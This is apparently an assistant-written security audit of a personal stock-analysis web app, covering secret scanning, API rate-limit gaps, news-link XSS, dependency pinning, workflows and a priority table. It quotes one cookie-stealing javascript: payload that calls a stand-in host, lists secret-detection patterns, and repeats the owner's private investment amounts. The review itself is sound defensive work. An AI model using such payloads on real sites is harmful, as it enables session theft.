## 1. 金鑰外洩

**🟢 git 全歷史掃描 — 乾淨**
- `git log -p --all` 全歷史 grep 常見金鑰樣式（AWS AKIA、GitHub ghp_/gho_/github_pat_、OpenAI sk-、Slack xox*、Google AIza、`-----BEGIN...PRIVATE KEY-----`）：0 命中。
- `git log --all --diff-filter=A --name-only` 找可疑檔名（.env/secret/credential/token/.pem/.key/config.json/firebase 等）：僅 `app/tsconfig.json` 誤中關鍵字，非真敏感檔，74 個 commit 裡沒有任何 .env / 憑證檔被加入過。
- 現有程式碼樹（.py/.ts/.tsx/.json/.md/.yml）同樣掃過一輪：0 命中。
- 判斷：這個 repo 從未把真實金鑰提交進 git，不需要輪替既有 commit 或改寫歷史。

**🟢 .gitignore 覆蓋度 — 足夠**
- `.venv/`、`data/cache/`、`.vercel` 都在忽略清單；`.vercel`（Vercel CLI 本機連結資訊，含 project/org id）本機存在但確認未被 track（`git ls-files` 沒有）。
- `data/` 底下追蹤的都是業務資料（追蹤清單、日誌、投資人問卷結果），不是憑證。**但**見下方 5.1，`data/investor_profile.json` 屬個資／財務隱私議題（不是憑證外洩，是隱私外洩）。

**🟢 GH Actions workflow — 沒有 echo secrets 風險**
- 三支 workflow（`weekly-brief.yml`／`daily-update.yml`／`alerts.yml`）都用 `env:` 傳入 `TG_BOT_TOKEN`／`TG_CHAT_ID`／`FINMIND_TOKEN`，程式內部使用（`os.environ.get`），沒有任何 `run:` 步驟直接 `echo $SECRET` 或把 secret 塞進 commit message／log。
- `daily-update.yml` 用預設 `GITHUB_TOKEN`（經 `actions/checkout` 帶的憑證）做 `git push`，不是 `GH_PAT`——`GH_PAT` 只在 Vercel 端的 `api/track.py` 使用，兩者分開，範圍正確。

**🔴 GH_PAT 範圍評估（已知待辦，這次量化風險）**
- `api/track.py` 只需要「對這一個 repo 的 `data/tracked_stocks.json` 做 GET+PUT（GitHub Contents API）」，也就是最小需求＝**單一 repo 的 Contents: Read and write**（fine-grained PAT 可以做到這麼窄）。
- 目前規格文件（`docs/contracts/data-contract-v1.md:177`）只寫「Vercel env `GH_PAT`」，沒有註記 token 類型／範圍。**如果目前掛的是 classic PAT 加 `repo` scope**（最常見的預設做法），代表：
  - 這個 token 對 Andy 帳號下**所有 repo**（含私有的）都有完整讀寫權，不只是這個 public repo。
  - `/api/track` 這支 serverless function 一旦被發現任何邏輯漏洞（例如未來改動引入注入、或 Vercel 平台本身被攻破），攻擊者能拿到的不是「改一個追蹤清單」而是「Andy 全部 GitHub repo 的寫入權」。
  - 這個 token 值存在 Vercel 平台（我這次掃描拿不到，也不該拿到），但**風險面完全取決於它的 scope**，這是唯一沒辦法從 code 端完全排除的洞。
- **建議修法（10 分鐘工作量）**：去 GitHub Settings → Developer settings → Fine-grained tokens，開一支新 token，**只勾這個 repo**、權限只給 `Contents: Read and write`，其餘全部 No access，換掉 Vercel 上的 `GH_PAT`，舊 classic token 撤銷。這樣就算 API 出洞，爆炸半徑鎖死在這個 repo。

## 2. API 攻擊面

### `api/analyze.py`

**🟢 注入 / SSRF — 無**
- `stock_id` 在 `do_GET` 一開頭就用 `^\d{4,6}$` 正則擋掉，不合法直接 404，後面完全不會碰到不合法字元。
- 送到 FinMind 的請求在 `api/_lib/finmind_lite.py:76-86` 用 `urllib.parse.urlencode(params)` 組 query string，`stock_id` 是 dict value 被正確編碼，不是字串拼接進 URL path，沒有路徑注入或 SSRF（host 是寫死的 `api.finmindtrade.com`，使用者輸入完全無法改變目標主機）。

**🔴 DoS／額度耗盡 — 有實際攻擊路徑，且比 `/api/track` 更危險**
- `/api/track` 有 origin 檢查＋每 instance 每小時 10 次限流；**`/api/analyze` 完全沒有任何限流**，只有「同一 instance、同一天、同一代號」的 `/tmp` 快取（`_read_cache`/`_write_cache`）。
- 實際影響：
  1. `/tmp` 快取**不跨 serverless instance**——Vercel 在流量增加時會開多個 lambda instance，每個 instance 各自獨立的 `/tmp`，所以「同代號當天只查一次」在高並發下形同虛設（多個 instance 各查一次）。
  2. 台股代號空間是 4-6 碼數字，攻擊者只要對不同代號打（不需要真實存在，`stock_exists()` 檢查前就已經進了 22 秒的查詢流程——不對，實際上 `stock_exists()` 是在 `run_analyze` 一開頭做的，如果代號不存在會 404，***但 `stock_exists()` 本身就要打一次 FinMind***），持續換代號打，就能繞過「同代號快取」，每次都觸發一次最壞情境 8~9 個 FinMind dataset 的序列查詢（單次最長 22 秒），直接：
     - 燒光 FinMind 免費／付費額度（服務對所有真實使用者變成 503「額度用完」）；
     - 燒 Vercel serverless 執行時間（22 秒 × 高併發 = 帳單成本，`maxDuration: 30` 代表每個惡意 request 幾乎能吃滿一整個 function 執行額度）。
  3. 這是**未認證、無限流、代理到一個計量／付費第三方 API** 的經典 cost-DoS／quota-exhaustion 缺口，而且完全不需要繞過任何機制——就是「換代號打」這麼簡單，連攻擊技巧都不用。
- **建議修法**：`/api/analyze` 至少要補上跟 `/api/track` 同等級的 per-instance `/tmp` 限流（比照 `_rate_limit_ok`，例如每 instance 每小時 N 次不分代號），治標；治本要上 Vercel Edge Config／KV 或任何跨 instance 共享狀態做真正的全域限流＋per-IP 節流（用 `X-Forwarded-For` 或 Vercel 提供的真實 IP header），這是目前最急的一個洞，優先度高於 GH_PAT scope。

**🟢 錯誤訊息 — 不洩內部資訊**
- 未預期例外只印到 `stderr`（server log），回應永遠是固定文案 `"查詢時發生問題，請稍後再試"`，不會把 traceback／內部路徑／FinMind 原始錯誤送到前端。

**🟡 快取投毒 — 低風險但存在**
- `_write_cache` 寫入 `/tmp/analyze_cache/<date>/<id>.json`，同 instance 內任何後續同代號請求都直接回這份快取，不重新驗證。如果查詢當下 FinMind 回傳異常/被污染的資料（理論上 FinMind 也可能被上游污染），會被快取一整天原樣回給所有打中同 instance 的使用者——不是攻擊者能直接控制的洞，但屬於「上游資料源不可信時的擴散半徑」，可接受，不用馬上動。

### `api/track.py`

**🟢 Origin 檢查 — 設計上刻意允許 curl，符合單人工具威脅模型**
- `_origin_allowed`：有 Origin 必須完全等於 `https://advisor-war-room.vercel.app`；沒有 Origin 才退而看 Referer 前綴；兩者都沒有（非瀏覽器請求）就放行。這代表任何人直接用 curl／腳本打 `/api/track` 都能繞過這層檢查（不帶 Origin/Referer 就過）——**但這不是繞過漏洞，是程式註解裡明講的設計取捨**：這層只防「別的網頁誘導使用者瀏覽器發跨站請求」（CSRF-like），不是身分驗證。真正擋濫用的是下面的限流。

**🟡 GET 呼叫未計入限流，可被拿來打 GitHub API 額度**
- `run_track` 流程：先查代號存在 → 讀 token → **`_gh_get_file`（打一次 GitHub API GET）** → 檢查是否已在清單 → 檢查是否額滿 → **這裡才做 `_rate_limit_ok()`** → append → PUT。
- 也就是說：「代號已在清單內」或「清單已滿 20 檔」這兩種情況，都會在限流檢查**之前**就先發生一次 GitHub API GET 呼叫，且完全不計入那 10 次/小時的額度。攻擊者只要重複 POST 一個已追蹤的代號（如 `2330`），可以無限次觸發 GitHub Contents API GET，跟 daily-update workflow 共用同一組 GitHub API 額度（該 PAT 的 5000 req/hr 上限），高頻攻擊下有機會干擾到排程 workflow 的 GitHub API 呼叫（機率低，因為 5000/hr 很寬裕，但設計上是個邏輯漏洞）。
- **建議修法**：把 `_rate_limit_ok()` 檢查移到 `_gh_get_file` 呼叫**之前**，任何一次 POST（不論後續是否真的寫入）都先過限流閘門。改動量很小（搬一行）。

**🟢 Body 解析 — 已妥善防護**
- `Content-Length` 上限 1024 bytes，超過或 ≤0 直接 404（不解析），沒有 body 炸彈風險（沒有用會展開的格式如 YAML/XML，純 JSON 且先卡大小）。

**🟢 每 instance 限流的實際影響 — 已知且可接受**
- 註解已明講「不是全域限流，冷啟或換 instance 就歸零」。跟 `/api/analyze` 不同的是，`/api/track` 的破壞力上限本來就被「20 檔上限」「代號需真實存在」「單一 repo 單一檔案」天花板鎖住，就算限流被繞過，最壞結果也只是多幾筆 GitHub commit，不是資源耗盡攻擊，風險等級可接受，不用列為急件。

## 3. 前端

**🟢 XSS — 沒有 `dangerouslySetInnerHTML`，沒有 `eval`/`innerHTML=`**
- 全 `app/src` 掃描：0 個 `dangerouslySetInnerHTML`、0 個 `eval(`/`new Function(`/`document.write`/`innerHTML =`。React 預設對文字節點自動 escape，遠端資料（FinMind／API 回傳文字）只要走 `{value}` render 就是安全的。

**🟡 `javascript:` URI href 注入（news 連結，防禦縱深議題）**
- `app/src/pages/StockSearch.tsx:383`：`<a href={n.url} target="_blank" rel="noreferrer">`，`n.url` 一路溯源到 `warroom/news.py`：
  - GDELT：`a.get("url", "")` 直接取 GDELT API JSON 欄位，零驗證（news.py 第 19 行）。
  - Google News RSS：正則抓 `<link>` 內容，零驗證（news.py 第 39 行）。
- React 對 `href` 屬性**不會**自動擋 `javascript:` scheme（這跟文字節點自動 escape 是兩回事）。如果 GDELT 或 Google News 回傳的文章 URL 欄位被塞進 `javascript:...` payload（理論上這兩個是可信度較高的聚合服務，正常不會發生，但屬於「你不控制的第三方輸入」），點擊該連結就會在頁面上下文執行任意 JS。
- PoC 思路（不實際攻擊）：若能讓 GDELT 索引到一篇 `url` 欄位是 `javascript:fetch('//evil/?c='+document.cookie)` 的「文章」（GDELT 對 URL 格式基本不做語意驗證，只做去重/收錄），且該文章命中戰情室的新聞搜尋關鍵字，使用者點了新聞列表裡的連結就中招。因為這個站沒有登入態／cookie 內沒有敏感 session（純靜態＋localStorage），實際能偷到的東西有限，但仍是規範性缺陷。
- **建議修法**：render 前檢查 `n.url` 是否以 `http://` 或 `https://` 開頭，不是就不渲染成可點連結（純文字顯示或整條丟棄）。一行 guard，5 分鐘工作量。

**🟢 localStorage 污染行為 — 安全**
- `watchlist.ts`／`holdings.ts` 讀出來的值都經過 `Array.isArray` + `typeof x === 'string'` 過濾；即使有人手動竄改 localStorage 塞入奇怪字串，下游 `fetchStockDetail` 一樣要過 `STOCK_ID_RE = /^\d{4,6}$/` 這關，非法值直接被當成 `NotFoundError`，不會被拿去做別的用途（沒有二次 eval / 沒有動態 import）。

**🟢 開放重定向 — 無**
- 全站沒有 `window.location =`／`location.href =`／`history.push(遠端值)` 這類 sink，不存在開放重定向。

## 4. 供應鏈

**🟢 npm — 乾淨**
```
cd app && npm audit --omit=dev
found 0 vulnerabilities
```
（含 devDependencies 一起跑也是 0 vulnerabilities）主要依賴：react 19.2、@tanstack/react-query 5、zod 4、vite 8——都用 `^` semver range，非鎖死大版本，但目前無已知漏洞。

**🟡 Python 依賴完全沒 pin 版本**
- `pyproject.toml` 只寫 `dependencies = ["pandas"]`，無版本號、無 lockfile。
- `.github/workflows/daily-update.yml`：`pip install pandas FinMind yfinance`——同樣沒有版本號，也沒有 `requirements.txt`/`poetry.lock`/`uv.lock`。
- 影響：每次 Vercel build／每次排程 workflow 執行都會抓當下 PyPI 上的最新版本，等於**沒有可重現的建置**，也是供應鏈攻擊面（若 `pandas`/`FinMind`/`yfinance` 任一個套件的維護者帳號被盜、發布惡意版本，會在下一次 build／排程自動被拉進來執行，且無從追溯是哪個版本引入問題）。
- **建議修法**：`pyproject.toml` 補上明確版本（至少 `pandas>=2.3,<3`），workflow 的 `pip install` 改成讀同一份 requirements 檔，中期可以上 `pip-audit` 或 Dependabot 監控。

## 5. Workflows

**🟢 權限最小化 — 已做到**
- `alerts.yml`／`daily-update.yml` 都明確宣告 `permissions: contents: write`（剛好對應需要 `git push` 的用途，沒有多餘的 `issues:write`／`pull-requests:write` 等）。
- `weekly-brief.yml` 沒有 `permissions:` 區塊（只發 TG 訊息，不 push），等於用 repo 預設權限——因為它本來就不寫入任何東西，就算預設是 read-write 也沒有被利用的路徑（沒有 PR trigger，見下方），可以不用管，但補一個明確的 `permissions: contents: read` 會更乾淨、也讓之後審查一眼看出這支不寫東西。

**🟡 第三方 action 版本 pin — 用 tag 不是 SHA**
- 三支 workflow 都是 `actions/checkout@v4`、`actions/setup-python@v5`——都是 GitHub 官方維護的 action，可信度高，但 pin 的是 major version tag 不是 commit SHA。嚴格供應鏈安全會要求 pin 到 SHA（防 tag 被重新指向的極端情境），對這個專案的風險等級來說是低優先，列為 🟡 給紀錄，不是急件。

**🟢 `pull_request` 觸發風險 — 確認沒有**
- 三支 workflow 觸發條件都只有 `schedule` + `workflow_dispatch`，完全沒有 `pull_request` 或 `pull_request_target`，所以不存在「外部 PR 帶惡意程式碼、拿到 repo secrets 執行」這條經典供應鏈攻擊路徑。這題是乾淨的，不用做任何事。

## 5.1 額外發現：個資／財務隱私外洩（不是傳統安全洞，但值得列管）

- `data/investor_profile.json` 是 public repo 裡的追蹤檔案，內容包含 Andy 的**實際部位分級金額**（試單 10 萬／標準 20 萬／加碼 40 萬／極高信心 60 萬）與停損區間偏好、核心持股（2330/0050）。這些是可從 GitHub 公開頁面直接讀到的真實個人財務資訊。
- 不是程式漏洞，是「這份資料該不該進 public repo」的取捨問題，但既然是「最嚴謹」等級的安全檢查，一併列出：如果不希望這些數字被任何人看到，選項是搬進私有的 `data/` 分支／改用 Vercel 環境變數存這幾個數字／或至少把絕對金額換成比例（10%／20%／40%／60% 之類），選哪個要 Andy 自己決定，這裡不擅自改。

## 總結：優先順序建議

| 優先度 | 項目 | 動作 |
|---|---|---|
| 🔴 1 | `/api/analyze` 完全無限流 | 補 per-instance 限流（比照 track.py），治本上跨 instance 共享狀態 |
| 🔴 2 | `GH_PAT` 疑似 broad-scope classic token | 換成 fine-grained token，只給這個 repo 的 Contents read/write |
| 🟡 3 | `/api/track` 的 GET 未計入限流 | 把 `_rate_limit_ok()` 挪到 `_gh_get_file` 之前 |
| 🟡 4 | 新聞連結 `href` 沒驗證 scheme | render 前檢查 `http(s)://` 開頭 |
| 🟡 5 | Python 依賴無版本 pin | pyproject + workflow 補版本號 |
| 🟡 6 | 缺 CSP／安全 headers | vercel.json 補 headers 區塊（CSP、X-Frame-Options、Referrer-Policy） |
| 🟡 7 | third-party action 用 tag 非 SHA pin | 低優先，官方 action 可信度高，有空再做 |
| 待決 | investor_profile.json 財務隱私 | 給 Andy 自己選要不要搬出 public repo |

（此份報告不含任何實際攻擊行為，所有 PoC 皆為思路描述。）
